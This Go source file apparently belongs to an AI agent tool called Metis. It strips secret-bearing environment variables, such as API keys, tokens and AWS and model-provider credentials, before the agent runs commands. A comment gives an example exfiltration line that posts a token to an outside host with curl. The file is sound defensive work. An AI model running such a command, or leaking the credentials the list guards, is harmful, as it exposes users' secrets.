package builtin

import (
	"strings"
)

// blockedEnvSubstrings are matched against the env var NAME (case-insensitive).
// Anything containing one of these tokens is dropped from the child environment
// before exec.Command runs. This protects against leaking credentials into
// commands the agent runs on the user's behalf — `curl https://x.com -d $TOKEN`
// can no longer pick up TOKEN if the user has it exported.
//
// Inspired by Hermes' `_HERMES_PROVIDER_ENV_BLOCKLIST` (tools/environments/local.py:19-104).
var blockedEnvSubstrings = []string{
	"API_KEY",
	"APIKEY",
	"TOKEN",
	"SECRET",
	"PASSWORD",
	"PASSWD",
	"PRIVATE_KEY",
	"AUTH",
	"CREDENTIALS",
	"BEARER",
	"OAUTH",
}

// blockedEnvExact are matched as full names. Useful for catches that don't
// have an obvious "secret" word in them but still leak provider state.
var blockedEnvExact = map[string]struct{}{
	"AWS_ACCESS_KEY_ID":     {},
	"AWS_SECRET_ACCESS_KEY": {},
	"AWS_SESSION_TOKEN":     {},
	"GH_TOKEN":              {},
	"GITHUB_TOKEN":          {},
}

// blockedEnvPrefixes are matched against the start of an env var NAME.
// `METIS_*` is excluded so the child shell can't introspect (or recursively
// invoke) Metis's own internal state.
var blockedEnvPrefixes = []string{
	"METIS_",
	"ANTHROPIC_",
	"OPENAI_",
	"MINIMAX_",
	"GOOGLE_API_",
	"DEEPSEEK_",
	"GROQ_",
	"TOGETHER_",
	"MISTRAL_",
	"PERPLEXITY_",
	"COHERE_",
	"OPENROUTER_",
}

// filterEnv returns environ with any sensitive variable stripped.
// Pass-through if dangerouslyInherit is true.
func filterEnv(environ []string, dangerouslyInherit bool) []string {
	if dangerouslyInherit {
		return environ
	}
	out := make([]string, 0, len(environ))
	for _, kv := range environ {
		eq := strings.IndexByte(kv, '=')
		if eq < 0 {
			out = append(out, kv)
			continue
		}
		name := kv[:eq]
		if isBlockedEnv(name) {
			continue
		}
		out = append(out, kv)
	}
	return out
}

func isBlockedEnv(name string) bool {
	upper := strings.ToUpper(name)
	if _, ok := blockedEnvExact[upper]; ok {
		return true
	}
	for _, p := range blockedEnvPrefixes {
		if strings.HasPrefix(upper, p) {
			return true
		}
	}
	for _, sub := range blockedEnvSubstrings {
		if strings.Contains(upper, sub) {
			return true
		}
	}
	return false
}
